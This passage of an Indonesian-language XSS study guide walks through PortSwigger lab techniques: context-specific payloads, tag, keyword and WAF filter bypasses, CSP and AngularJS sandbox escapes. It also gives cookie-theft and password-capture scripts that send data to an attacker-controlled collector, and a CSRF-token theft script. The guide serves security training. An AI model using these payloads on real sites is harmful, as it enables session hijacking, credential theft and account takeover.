Karena `'` dan `\` keduanya di-escape, tidak bisa break JS string. Tapi `<>` **tidak** di-encode. Jadi bisa break keluar dari `<script>` tag:

```text
Payload: </script><script>alert(1)</script>

Hasil:
<script>
var searchTerms = '</script>
<script>alert(1)</script>';
</script>
```

Browser menutup `<script>` pertama di `</script>`, kemudian mengeksekusi `<script>alert(1)</script>` yang baru.

---

## 5.4c JS String — Angle Brackets & Double Quotes HTML Encoded, Single Quotes Escaped (Backslash Tidak Di-escape)

**PortSwigger Lab: Reflected XSS into JS string with angle brackets and double quotes HTML-encoded and single quotes escaped**

Encoding yang diterapkan:

- `<>` → `&lt;` `&gt;` (HTML encoded)
- `"` → `&quot;`
- `'` → `\'` (escaped dengan backslash)
- `\` → **TIDAK di-escape** ← inilah celahnya

```text
Payload: \'-alert(1)//

Proses server-side:
- \ → \ (tidak diubah)
- ' → \'

Output di HTML:
var searchTerms = '\\'-alert(1)//';

Interpretasi JS:
- \\ = escaped backslash = literal karakter \
- '  = MENUTUP STRING (bukan bagian dari escape lagi)
- -alert(1) = JS expression
- // = comment
```

Alert execute! ✅

---

## 5.4d JS String dengan Encoding Lain

|Encoding yang diterapkan|Teknik|
|---|---|
|Hanya angle brackets HTML-encoded|`'-alert(1)-'` atau `';alert(1)//`|
|Single quotes escaped, backslash escaped|`</script>` breakout (5.4b)|
|Single quotes escaped, backslash tidak di-escape|`\'-alert(1)//` (5.4c)|
|Semua di-HTML-encode|Cek context lain (attribute, template literal)|

---

# 5.5 JavaScript Template Literal

## 📌 Kapan Digunakan

Input berada di dalam JavaScript template literal (backtick string):

```javascript
var msg = `Welcome, INPUT!`;
```

---

## PortSwigger Lab: Reflected XSS into template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Semua karakter escape diblok. Tapi template literal punya `${}` yang mengeksekusi JS:

```text
Payload: ${alert(1)}

Context:
var msg = `Welcome, ${alert(1)}!`;
```

`${}` dieksekusi sebagai JavaScript expression → alert(1) jalan.

---

# 5.6 onclick Event Handler Context

## 📌 Kapan Digunakan

Input tersimpan dan muncul di dalam event handler onclick di HTML:

```html
<a href="..." onclick="var tracker={track(){}};tracker.track('INPUT');"></a>
```

---

## PortSwigger Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Encoding yang diterapkan:

- `<>` → HTML encoded
- `"` → HTML encoded
- `'` → `\'`
- `\` → `\\`

Semua cara escape JS string biasa tidak bisa! Tapi ini **HTML attribute** — HTML entities di-decode browser **sebelum** JavaScript dijalankan.

Kuncinya: `&apos;` adalah HTML entity untuk `'`. Kalau di-store sebagai `&apos;`, server tidak menganggapnya sebagai karakter `'` jadi tidak di-escape. Browser decode `&apos;` → `'` saat render → JS melihat `'` yang menutup string.

Input di field "Website":

```text
Payload: http://foo?&apos;-alert(1)-&apos;

Hasil di HTML:
onclick="...tracker.track('http://foo?'-alert(1)-'');"
```

`&apos;` → `'` → menutup JS string → `-alert(1)-` → execute.

---

# 5.7 Canonical Link Tag Context

## 📌 Kapan Digunakan

Input muncul di atribut `href` pada canonical link tag di `<head>`:

```html
<head>
<link rel="canonical" href='INPUT'/>
</head>
```

---

## PortSwigger Lab: Reflected XSS in canonical link tag

Karena ini di `<head>`, tidak terlihat di rendered page. Angle brackets HTML-encoded. Tapi single quotes bisa dipakai untuk inject attributes:

```text
Payload: ?'accesskey='x'onclick='alert(1)

URL: https://TARGET/?'accesskey='x'onclick='alert(1)

Hasil:
<link rel="canonical" href='https://TARGET/?'accesskey='x'onclick='alert(1)'/>
```

Tag `<link>` tidak visible, tapi punya `accesskey` dan `onclick`. Untuk trigger: tekan **Alt+Shift+X** (Chrome Windows/Linux) atau **Ctrl+Alt+X** (Safari macOS).

---

# 5.8 URL / javascript: Context

## 📌 Kapan Digunakan

Input berada di atribut yang berisi URL (`href`, `src`, `action`, dll) dan tidak ada sanitization pada `javascript:` scheme.

Sudah dibahas di Section 5.3. Tambahan dan klarifikasi:

```html
<!-- jQuery href sink -->
<a href="javascript:alert(1)">link</a>
```

**Catatan `<form action>`:** Perilaku `javascript:` scheme pada atribut `action` dari `<form>` bersifat **browser-dependent**. Browser modern (Chrome, Edge, Firefox terbaru) umumnya memblok eksekusi `javascript:` scheme saat form di-submit. Namun berbeda dengan `<a href="javascript:...">` yang di-trigger saat klik link, form submission melalui jalur navigasi yang berbeda. Di lingkungan lab, behavior ini bersifat controlled. Di real target: test dulu, jangan assume.

Pendekatan valid untuk form context:

```html
<!-- Kombinasi dengan event handler -->
<form action="javascript:void(0)" onsubmit="alert(1)">

<!-- Atau break attribute dan inject handler -->
Payload: " onsubmit="alert(1)
```

---

# 5.9 CSS Context

## 📌 Kapan Digunakan

Saat input masuk ke CSS property atau `<style>` tag.

```html
<style>
body {
  color: INPUT;
}
</style>
```

Atau inline style attribute:

```html
<div style="color: INPUT">
```

---

## Important Distinction

**CSS injection ≠ XSS otomatis.** Modern browsers tidak menjadikan arbitrary CSS injection sebagai JavaScript execution secara langsung.

Test fokus pertama — apakah style benar-benar berubah:

```text
Input: red

Hasil:
color: red;
```

Jika CSS context dapat di-break ke HTML (aplikasi menyuntikkan CSS ke dalam `<style>` yang sudah ada di halaman), dampaknya bergantung pada bagaimana CSS dimasukkan ke DOM.

---

## Kapan CSS Injection Bisa Menjadi XSS

1. **Jika input di `<style>` tag dan angle brackets tidak di-encode** → bisa close `</style>` dan inject HTML:
    
    ```text
    Payload: red}</style><img src=1 onerror=alert(1)>
    ```
    
2. **Jika input di `style` attribute dan bisa break ke HTML attribute** → inject event handler setelah menutup `style`:
    
    ```text
    Payload: color:red" onmouseover="alert(1)
    ```
    
3. **Jika input hanya ke CSS property dan angle brackets di-encode** → catat sebagai CSS injection informatif, bukan XSS.
    

---

# 5.10 JSON Context

## 📌 Kapan Digunakan

Saat input menjadi bagian JSON/API response atau JavaScript-generated JSON.

```javascript
const data = {"name":"INPUT"};
```

---

## Vulnerable Flow

```text
User Input
│
▼
JSON
│
▼
JavaScript parser
│
▼
DOM sink (innerHTML / document.write / eval)
│
▼
XSS
```

JSON encoding yang benar **tidak otomatis** menghasilkan XSS:

```json
{
  "name": "<script>alert(1)</script>"
}
```

XSS muncul **hanya jika** nilai tersebut kemudian masuk ke dangerous sink:

```javascript
element.innerHTML = data.name;
```

---

## Cara Test JSON Context

```text
1. Kirim marker ke API endpoint:
   POST /api/profile
   Content-Type: application/json
   {"name":"xss1234"}

2. Cari di mana response di-render:
   - Apakah masuk ke DOM via innerHTML?
   - Apakah di-eval?
   - Apakah dimasukkan ke document.write?

3. Trace path JSON value → DOM sink di browser DevTools

4. Kalau sink ditemukan, gunakan payload sesuai sink:
   - innerHTML sink → <img src=1 onerror=alert(1)>
   - eval sink → alert(1)
```

---

## JSON Escape Bypass

Jika ada JSON string encoding tapi backslash tidak di-escape (seperti Lab DOM XSS Reflected):

```text
Input: \"-alert(1)}//

Hasil JSON yang dikirim server:
{"searchTerm":"\\"-alert(1)}//"}

Dalam eval:
- \\ = literal \
- " = menutup string
- -alert(1) = JS expression
```

Lihat Section 3.4 (Reflected DOM XSS Lab) untuk detail.

---

# 5.11 AngularJS Expression (CSTI)

## 📌 Kapan Digunakan

Halaman menggunakan AngularJS (`ng-app` attribute atau Angular framework). Angle brackets dan double quotes HTML-encoded. Tapi AngularJS mengevaluasi ekspresi `{{ }}`.

---

## Deteksi AngularJS

```html
<html ng-app>
<!-- atau -->
<div ng-app="myApp">
<script src="angular.js"></script>
```

---

## PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Proof of concept (basic CSTI):

```text
Payload: {{7*7}}

Kalau response menampilkan "49" → AngularJS CSTI confirmed
```

XSS payload:

```text
Payload: {{$on.constructor('alert(1)')()}}
```

Penjelasan:

- `$on` adalah AngularJS internal function
- `.constructor` adalah Function constructor
- `('alert(1)')` → membuat function dengan isi `alert(1)`
- `()` → memanggil function tersebut

Alternatif:

```text
{{constructor.constructor('alert(1)')()}}
```

---

## Cookie Theft via CSTI

```text
{{constructor.constructor("fetch('http://ATTACKER:8000/?c='+document.cookie)")()}}
```

Berguna saat XSS confirm via AngularJS dan perlu membuktikan impact tanpa `alert`.

---

## Context Master Table

|Context|Contoh Vulnerable|First Test|Typical PoC|
|---|---|---|---|
|HTML body|`<div>INPUT</div>`|marker + tag|`<script>alert(1)</script>`|
|Attribute|`<input value="INPUT">`|break `"`|`" onmouseover="alert(1)`|
|JS `'...'`|`var x='INPUT'`|break `'`|`'-alert(1)-'`|
|JS `"..."`|`var x="INPUT"`|break `"`|`"-alert(1)-"`|
|Template literal|`` var x=`INPUT` ``|interpolation|`${alert(1)}`|
|href|`<a href="INPUT">`|inspect scheme|`javascript:alert(1)`|
|onclick HTML entity|`onclick="goto('INPUT')"`|`&apos;` trick|`http://foo?&apos;-alert(1)-&apos;`|
|CSS|`color: INPUT`|style change|context-dependent (close style, inject tag)|
|JSON|`{"x":"INPUT"}`|trace parser/sink|sink-dependent|
|DOM|`innerHTML=source`|trace source|`<img src=1 onerror=alert(1)>`|
|AngularJS|`<div>{{INPUT}}</div>`|`{{7*7}}`|`{{constructor.constructor('alert(1)')()}}`|

---

# 🧬 6. Filter Bypass Techniques

> **Prinsip:** Jangan menebak bypass. Identifikasi dulu **apa yang diblok**, kemudian baru mutate secara sistematis.

---

# 6.1 Tag Fuzzing dengan Burp Intruder

## 📌 Kapan Digunakan

WAF atau aplikasi memblok tag tertentu. Perlu identifikasi tag mana yang lolos.

**PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked**

---

## Cara Fuzzing Tag dengan Burp Intruder

```text
Langkah 1:
Di Burp Repeater, kirim request dengan payload test:
GET /search?q=<script>alert(1)</script> HTTP/2

Kalau 400/blocked → tags difilter.

Langkah 2:
Send to Intruder

Langkah 3:
Di Intruder, ubah payload:
GET /search?q=<§tag§> HTTP/2
(§ adalah injection point marker)

Positions: Sniper, injection point di antara < dan >

Langkah 4:
Payloads tab:
- Payload type: Simple list
- Paste semua tag dari PortSwigger XSS cheat sheet:
  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Langkah 5:
Start attack

Langkah 6:
Sort by Length atau Status code
- Status 200 = mungkin allowed
- Status 400 = blocked
- Response length berbeda = tag diproses berbeda
```

---

## Identifikasi Allowed Tag

Setelah tahu tag yang lolos (misal: `<body>`), fuzz event handler-nya (Section 6.2).

---

# 6.2 Attribute Fuzzing dengan Burp Intruder

## Setelah tag ditemukan, fuzz attribute/event handler

```text
Langkah 1:
Di Intruder, ubah payload:
GET /search?q=<body §event§=alert(1)> HTTP/2

Injection point di nama event.

Langkah 2:
Payload list: semua event handler dari XSS cheat sheet:
onload
onerror
onmouseover
onfocus
onclick
onblur
onresize
onscroll
...

Langkah 3:
Start attack → cari yang response berbeda (200/diizinkan)
```

---

## Contoh Hasil Bypass

Kalau tag `<body>` dan event `onresize` allowed:

```html
<body onresize="print()">
```

Tapi tidak bisa langsung trigger `onresize` secara otomatis. Deliver via iframe:

```html
<!-- Di exploit server -->
<iframe src="https://TARGET/?q=<body onresize=print()>" onload="this.style.width='100px'">
```

---

# 6.3 Custom Tag Bypass

## PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones

Semua standard HTML tag diblok kecuali custom tags. Custom tag dengan `tabindex` + `onfocus` + `id` = auto-trigger dengan URL fragment:

```text
Payload:
<xss id=x onfocus=alert(1) tabindex=1>

URL:
https://TARGET/?q=<xss id=x onfocus=alert(1) tabindex=1>#x
```

`#x` di URL → browser auto-focus ke element dengan `id="x"` → `onfocus` trigger.

Delivery ke victim (di exploit server):

```html
<script>
document.location = 'https://TARGET/?q=<xss id=x onfocus=alert(1) tabindex=1>#x'
</script>
```

---

# 6.4 SVG Markup Bypass

## PortSwigger Lab: Reflected XSS with some SVG markup allowed

Fuzz dulu tag dan event yang diizinkan. Hasil: `<svg>`, `<animatetransform>` allowed, event `onbegin` allowed.

```html
<svg><animatetransform onbegin=alert(1)>
```

`<animatetransform>` adalah SVG animation element. Event `onbegin` fire saat animation dimulai (langsung saat render).

Variasi SVG lain yang sering lolos:

```html
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

# 6.5 Keyword Filter Bypass

## `alert` difilter?

```javascript
// Pakai confirm atau prompt
<img src=1 onerror=confirm(1)>
<img src=1 onerror=prompt(1)>

// Pakai eval dengan encoding
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
// atob('YWxlcnQoMSk=') = 'alert(1)'

// String konstruksi
<img src=1 onerror=window['ale'+'rt'](1)>

// Template literal
<script>window[`al`+`ert`](1)</script>
```

## `onerror` / `onload` difilter?

```html
<img src=1 onerror=alert(1)>        → blok
<body onresize=alert(1)>            → coba
<body onpageshow=alert(1)>          → coba
<svg onload=alert(1)>               → coba
<details ontoggle=alert(1) open>    → coba
<marquee onstart=alert(1)>          → coba (deprecated tapi kadang lolos)
<input onfocus=alert(1) autofocus>  → coba
```

---

# 6.6 Quote Filter Bypass

Kalau `'` dan `"` diblok di HTML attribute:

```html
<!-- Tanpa quotes di attribute -->
<img src=1 onerror=alert(1)>         ← sudah tanpa quote
<svg onload=alert(1)>                ← sudah tanpa quote
```

Kalau dalam JS string dan semua quote diblok:

```javascript
// Pakai String.fromCharCode
<script>alert(String.fromCharCode(88,83,83))</script>

// Pakai template literal (backtick)
<script>alert`1`</script>

// Pakai eval dengan base64
<script>eval(atob('YWxlcnQoMSk='))</script>
```

---

# 6.7 Space Filter Bypass

## 📌 Kapan Digunakan

Saat whitespace diblok atau di-strip pada attribute boundaries.

## Alternatif Whitespace

```html
<!-- Tab character -->
<img	src=1	onerror=alert(1)>

<!-- Newline -->
<svg
onload=alert(1)>

<!-- Forward slash sebagai separator (HTML spec) -->
<img/src=1/onerror=alert(1)>

<!-- Forward slash sebagai tab/newline alternative:
     NOTE: HTML comments (/* */) HANYA berlaku di CSS, BUKAN di dalam HTML tag attributes.
     Tidak ada yang namanya HTML comment sebagai whitespace di tag HTML. -->
```

Contoh penggunaan di URL parameter:

```text
Payload: <img%09src=1%09onerror=alert(1)>
(tab URL-encoded = %09)
```

---

# 6.8 Bracket Filter Bypass

## 📌 Kapan Digunakan

Saat `(` dan `)` difilter, sehingga `alert(1)` tidak bisa dipakai langsung.

## Backtick Call (Tagged Template Literal)

```javascript
alert`1`
```

Backtick memanggil `alert` sebagai tagged template function dengan argument `["1"]`.

## throw/onerror Trick

```javascript
javascript:throw onerror=alert,1337
```

- `throw` melontarkan exception
- `onerror=alert` set global error handler ke `alert`
- `1337` adalah value yang di-throw → `alert(1337)` terpanggil

## Method Reference

```javascript
window.alert.call(null,1)
```

Validitas bergantung pada context dan apakah `.` dan `,` juga difilter. Lihat Section 9.7 untuk context spesifik PortSwigger lab.

---

# 6.9 WAF Bypass Approach

## Systematic Approach

```text
1. Identify baseline — payload standar seperti apa responsenya?
2. Isolate — bagian mana yang diblok? Tag? Attribute? Keyword?
3. Fuzz — gunakan Burp Intruder untuk fuzz per komponen
4. Mutate — ubah case, spasi, encoding
5. Verify — konfirmasi di browser, bukan hanya Repeater
```

## Case Variation

```html
<sCrIpT>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
```

## Encoding

```html
<!-- HTML entity dalam attribute -->
<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- &#97;&#108;... = alert(1) -->

<!-- URL encoding dalam URL parameter -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encoding (hanya berguna jika ada multiple decoding stage) -->
%253Cscript%253E
```

## Filter Identification Script

Sebelum fuzz random, identifikasi dulu karakter mana yang lolos:

```bash
for c in '<' '>' '"' "'" '/' 'script' 'alert' 'onerror' 'onload'; do
  r=$(curl -s --get --data-urlencode "q=TEST${c}TEST" "http://TARGET/search" | grep -o "TEST${c}TEST" | head -1)
  [ -n "$r" ] && echo "[PASS] $c" || echo "[BLOCK] $c"
done
```

Output menunjukkan persis apa yang perlu di-bypass.

---

# 6.10 Polyglot XSS

## 📌 Kapan Digunakan

Saat context injeksi belum diketahui secara pasti, atau ingin menguji satu payload universal di multiple context sekaligus.

## Contoh Basic (HTML body, atribut, comment block)

```javascript
'"><img src=x onerror=alert(1)>
```

## Contoh Kompleks (Multi-Context)

Bekerja di script tag, style tag, textarea, title, tag attribute, HTML body:

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=alert(1)//
```

## Kapan Polyglot TIDAK Disarankan

- **Context sudah teridentifikasi** → payload spesifik jauh lebih efektif. `" onfocus="alert(1)` lebih bersih dari polyglot jika input ada di `<input value="...">`.
- **WAF/IDS aktif** → polyglot sangat panjang dan memuat banyak signature karakter berbahaya, mudah memicu rule WAF.
- **Learning/CTF** → analisis context lebih dulu untuk bangun muscle memory. Polyglot membuat kebiasaan buruk.

---

# 🍪 7. XSS to Cookie Theft

# 7.1 Setup Receiver

## Burp Collaborator (Recommended untuk Labs)

```text
1. Burp Suite → Burp Collaborator
2. "Copy to clipboard"
→ Dapat: abc123xyz.oastify.com

3. Pakai URL ini di payload:
   fetch('https://abc123xyz.oastify.com/?c='+document.cookie)

4. Setelah XSS trigger → Collaborator → "Poll now"
5. Lihat incoming request dengan cookie
```

## Exploit Server PortSwigger (Untuk Labs)

PortSwigger labs menyediakan exploit server. Pakai URL-nya sebagai callback:

```text
https://exploit-abc123.exploit-server.net/log?cookie=...
```

## Python HTTP Server (Local Lab / Fallback)

```bash
python3 -m http.server 8000
```

Callback URL: `http://ATTACKER-IP:8000/`

> Catatan: untuk PortSwigger labs, pakai exploit server atau Collaborator — python server tidak reachable dari cloud labs.

---

# 7.2 XSS Payload Cookie Theft

**PortSwigger Lab: Exploiting cross-site scripting to steal cookies**

Stored XSS di komentar blog. Admin melihat komentar. Steal cookie admin.

Payload di field komentar:

```html
<script>
fetch('https://BURP-COLLABORATOR-URL/?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau menggunakan redirect:

```html
<script>
document.location='https://BURP-COLLABORATOR-URL/?cookie='+document.cookie
</script>
```

Atau via image tag (lebih stealth, bypass beberapa CSP):

```html
<script>
new Image().src='https://BURP-COLLABORATOR-URL/?c='+document.cookie
</script>
```

---

## Flow Lengkap di Lab

```text
1. Buka Burp Collaborator → Copy URL
2. Isi komentar di blog post:
   <script>
   fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))
   </script>

3. Submit komentar

4. Admin bot akan membuka page (otomatis di lab)

5. Burp Collaborator → Poll now
   → Lihat:
   GET /?c=session%3Dadmin-session-token HTTP/1.1

6. Decode: session=admin-session-token

7. Di browser: DevTools → Application → Cookies
   → Ubah session cookie jadi admin-session-token

8. Refresh → Login sebagai admin
```

---

# 7.3 Apa yang Dilakukan dengan Cookie

```text
Stolen cookie: session=abc123xyz

Options:
├── Buka browser
├── DevTools → Application → Cookies
├── Edit / Add cookie: session=abc123xyz
├── Refresh halaman
└── Jika valid: logged in sebagai victim
```

Limitations:

- `HttpOnly=true` → `document.cookie` tidak bisa baca cookie tersebut
- `SameSite=Strict/Lax` → cookie tidak dikirim dalam cross-site requests (attacker menggunakan cookie dari origin berbeda); XSS yang berjalan pada same-origin target tidak terdampak — cookies tetap dikirim
- Session bound to IP/UserAgent → cookie mungkin tidak valid di browser lain

---

## Cross-Service Correlation

Setelah XSS berhasil dan dapat credentials/session:

```text
XSS → Cookie/Credential Stolen
│
├──→ Coba ke /admin → privilege escalation
├──→ Coba credential ke SSH (port 22)
├──→ Coba privilege escalation di web app
└──→ XSS + fetch ke internal host → SSRF via victim browser
     (→ [🌐 22 — SSRF Workflow](/docs/ssrf))
```

---

# 🔑 8. XSS to Password Capture & CSRF Bypass

# 8.1 XSS to Capture Passwords

**PortSwigger Lab: Exploiting XSS to capture passwords**

> 🔬 **PORTSWIGGER LAB-SPECIFIC:** Teknik ini memanfaatkan browser autofill. Di lab PortSwigger, victim bot dikonfigurasi untuk mengisi credentials. Di real browser, behavior autofill sangat bervariasi:
> 
> - Browser modern memiliki anti-phishing heuristics yang semakin ketat
> - Autofill hanya terjadi jika user telah menyimpan credentials untuk domain tersebut
> - Chrome, Firefox, Safari berbeda dalam kapan dan bagaimana mereka autofill
> - Teknik ini **tidak dijamin bekerja** di semua konteks real-world

Browser modern **kadang** auto-fill password ketika menemukan form dengan `name=username` dan `type=password`. Inject form palsu via Stored XSS:

```html
<input name=username id=username>
<input type=password name=password onchange="
var u=document.getElementById('username').value;
fetch('https://BURP-COLLABORATOR-URL/?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(this.value))
">
```

Flow:

```text
1. Inject payload di comment/profile
2. Admin/victim buka page
3. Browser auto-fill credentials di form palsu
4. `onchange` trigger saat password field terisi
5. Credentials dikirim ke Collaborator
6. Check Collaborator → dapat username + password
```

---

# 8.2 XSS to Bypass CSRF Defenses

**PortSwigger Lab: Exploiting XSS to bypass CSRF defenses**

XSS yang berjalan pada **same-origin** dengan aplikasi tidak perlu "bypass" CSRF dalam arti tradisional. Script sudah berjalan di dalam origin target, sehingga:

- Browser menyertakan session cookies pada requests yang dibuat script tersebut secara otomatis
- Script dapat membaca CSRF token langsung dari DOM (karena same-origin access)
- CSRF token defense tidak menjadi barrier — script bisa membaca dan menggunakan token

```text
XSS confirmed (same-origin execution)
↓
Apakah action yang diinginkan membutuhkan CSRF token?
 ├── Ya → fetch halaman yang berisi token → extract → sertakan di request
 └── Tidak → langsung kirim authenticated request
↓
Cookies sesi victim disertakan otomatis oleh browser → action berhasil sebagai victim
```

Flow lengkap (contoh: ganti email):

```text
1. XSS execute di browser victim
2. Fetch halaman yang berisi CSRF token
3. Extract CSRF token dari response
4. Buat request dengan token yang dicuri
5. Kirim request berbahaya (misal: ganti email)
```

Payload (fetch API):

```html
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      body: 'csrf='+token+'&email=attacker@evil.com',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });
  });
</script>
```

---

# 8.3 HttpOnly Cookie — Batas dan Alternatif

```text
Cookie: session=abc; HttpOnly

document.cookie → kosong untuk cookie ini
```

`HttpOnly` mencegah JavaScript membaca cookie. Tapi XSS masih berbahaya:

```text
Alternatif impact dengan HttpOnly:

├── CSRF via XSS (cookie otomatis disertakan browser)
├── Baca/modifikasi data sensitif di DOM
├── Capture credentials dari form (Section 8.1)
├── Redirect ke phishing page
├── Keylogging
└── Screenshot via html2canvas library (hanya jika library tersebut dimuat di halaman;
         native Canvas API tidak dapat screenshot page content)
```

---

# 🛡️ 9. CSP Bypass

# 9.1 Apa Itu CSP

**Content Security Policy (CSP)** adalah HTTP header yang membatasi resource apa yang boleh di-load dan dieksekusi browser.

```text
Content-Security-Policy: script-src 'self'; object-src 'none';
```

CSP bisa mencegah XSS eksekusi. Tapi banyak misconfiguration yang bisa di-bypass.

---

# 9.2 Cara Detect CSP

Di Burp Suite: cek response headers setelah intercept request.

```text
Burp Proxy → HTTP History → klik response → Headers tab

Cari:
Content-Security-Policy: ...
```

Atau via curl untuk simple header check:

```bash
curl -sI https://TARGET/ | grep -i content-security-policy
```

Paste hasil ke **CSP Evaluator**: https://csp-evaluator.withgoogle.com/

---

# 9.3 Common CSP Misconfigurations

|CSP Rule|Masalah|Bypass Idea|
|---|---|---|
|`script-src 'unsafe-inline'`|Inline script **mungkin** allowed|Periksa nonce/hash: keduanya override `unsafe-inline` — lihat decision logic di bawah|
|`script-src 'unsafe-eval'`|eval() dan variannya allowed|Lihat note di bawah|
|`script-src *.trusted.com`|Wildcard domain|Cari subdomain yang kontrollable|
|`script-src cdn.example.com`|CDN whitelisted|Cari JSONP endpoint di CDN tersebut|
|`script-src 'nonce-xxx'`|Nonce-based|Cari nonce yang bocor / reused|
|`report-uri` yang reflect input|Header injection|Inject directive baru|
|Tidak ada CSP|CSP bukan execution barrier di sini|Execution masih bergantung pada sink, context, encoding, sanitization, dan browser behavior — bukan otomatis berhasil|

---

## Decision Logic: Apakah `unsafe-inline` Efektif?

```text
CSP mengandung unsafe-inline
↓
Periksa script-src / default-src
↓
Ada nonce? (contoh: 'nonce-abc123')
 ├── Ya → browser MENGABAIKAN unsafe-inline (nonce override)
 │         → evaluasi nonce leak / reuse (Section 9.4)
 └── Tidak
       ↓
Ada hash? (contoh: 'sha256-xxx')
 ├── Ya → browser MENGABAIKAN unsafe-inline (hash override)
 │         → hash hanya berlaku untuk script content yang diketahui
 └── Tidak
       ↓
Ada 'strict-dynamic'?
 ├── Ya → unsafe-inline diabaikan di browser modern yang mendukungnya
 │         → strict-dynamic sendiri bukan bypass — ia mengizinkan script yang
 │           di-load oleh trusted script (via nonce/hash), bukan inline injection
 │         → evaluasi apakah ada trusted script yang bisa kamu leverage
 └── Tidak
       ↓
unsafe-inline EFEKTIF → inline <script> dan event handler jadi kandidat
(masih perlu verifikasi di browser — execution juga bergantung pada sink dan context)
```

> **Catatan:** Interaksi antara `script-src`, `script-src-elem`, dan `script-src-attr` berbeda: `script-src-attr` mengontrol event handler; `script-src-elem` mengontrol `<script>` block. Header injection ke `report-uri` (Section 9.9) dapat menambahkan `script-src-attr 'unsafe-inline'` tanpa mempengaruhi `script-src`, yang memungkinkan event handler meski `<script>` masih diblok.

---

## Catatan Kritis `unsafe-eval`

`'unsafe-eval'` tidak hanya mengizinkan `eval()`. Direktif ini membuka **seluruh primitif evaluasi string JavaScript**, termasuk:

```javascript
eval(string)
Function(string)()
setTimeout("string", delay)    // string form, bukan function
setInterval("string", delay)   // string form
window.execScript(string)      // legacy IE ONLY — tidak ada di browser modern; bisa diabaikan
```

Jika CSP mengaktifkan `'unsafe-eval'`, injeksi yang diblok dari inline `<script>` **dapat dieksekusi secara dinamis** melalui vektor evaluasi string di atas, asalkan ada script trusted yang meneruskan user input ke fungsi-fungsi tersebut.

---

# 9.4 CSP Bypass Techniques

## Bypass via JSONP

Kalau CSP whitelist domain yang punya JSONP endpoint:

> ⚠️ **PORTSWIGGER LAB-SPECIFIC CONCEPT:** Setiap JSONP bypass bergantung pada keberadaan endpoint JSONP yang exploitable pada domain yang di-whitelist. Endpoint berubah terus — selalu verifikasi manual. Jangan mengandalkan endpoint spesifik yang dikutip di blog lama.

```text
CSP: script-src https://accounts.google.com

Konsep: cari endpoint JSONP di domain tersebut
Contoh (konseptual — endpoint aktual harus diverifikasi):
https://accounts.google.com/o/oauth2/revoke?token=alert(1337)

Inject:
<script src="https://whitelisted-domain.com/jsonp?callback=alert(1337)"></script>
```

> **Cara mencari JSONP endpoint:**
> 
> 1. Cari parameter `callback=`, `cb=`, `jsonp=`, atau `fn=` di endpoint domain
> 2. Test: apakah response membungkus output dengan nilai callback? → JSONP endpoint
> 3. Google Dork: `site:whitelisted-domain.com inurl:callback`

## Bypass via Open Redirect ke Whitelisted Domain

```text
CSP: script-src https://cdn.example.com

Open redirect di cdn.example.com:
https://cdn.example.com/redirect?url=https://attacker.com/evil.js

Inject:
<script src="https://cdn.example.com/redirect?url=https://attacker.com/evil.js"></script>
```

## Bypass via Nonce Leak

> 🔬 **LAB-SPECIFIC:** Bypass ini hanya berlaku jika server menggunakan nonce **static** (nilai tetap per session atau per-load), yang merupakan anti-pattern. CSP nonce yang diimplementasikan dengan benar harus **kriptografis random dan berbeda setiap response**.

Kalau nonce ada di DOM dan bisa dibaca (misal di attribute yang tidak eksekusi script, atau dari reflection):

```html
<script nonce="abc123">
// legitimate script — nonce terlihat di DOM
</script>

<!-- Attacker inject (HANYA jika nonce statis/tidak berubah): -->
<script nonce="abc123">alert(1)</script>
```

> Jika nonce berubah setiap request (implementasi benar), bypass ini tidak berfungsi.

---

# 9.5 AngularJS Sandbox Escape

> 🔬 **PORTSWIGGER LAB-SPECIFIC — AngularJS 1.x < 1.6:** AngularJS sandbox hanya ada di **AngularJS 1.x versi sebelum 1.6**. Mulai AngularJS 1.6, sandbox dihapus secara resmi karena terbukti tidak bisa di-enforce. Angular 2+ (TypeScript-based) tidak memiliki CSTI/sandbox model yang sama. Semua teknik sandbox escape di section ini hanya berlaku untuk AngularJS 1.x tertentu.
> 
> Untuk PortSwigger Academy: lab menggunakan AngularJS 1.x versi lama yang memiliki sandbox.

## Konsep

AngularJS menjalankan ekspresi `{{ }}` di sandboxed scope. Sandbox mencegah akses ke `window`, `document`, dan constructor chain. Tapi sandbox ini bisa di-escape pada versi AngularJS 1.x tertentu.

---

## PortSwigger Lab: Reflected XSS with AngularJS sandbox escape without strings

Filter memblok karakter string (`'` dan `"`). Harus escape sandbox tanpa menggunakan string literals.

Teknik: override `charAt` method AngularJS menggunakan `[].join`, lalu gunakan `fromCharCode` untuk construct string tanpa quote:

```text
Payload:
?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Penjelasan:

- `toString().constructor.prototype.charAt=[].join` → override charAt agar selalu return empty string, memungkinkan AngularJS melewati whitelist check
- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`
- `orderBy` filter evaluate expression tersebut
- `=1` di akhir assign ke left-hand side

---

## PortSwigger Lab: Reflected XSS with AngularJS sandbox escape and CSP

CSP memblok inline script. AngularJS sandbox juga aktif.

```text
Payload:
?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>

Delivery via exploit server:
<script>
document.location='https://TARGET/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'>#x'
</script>
```

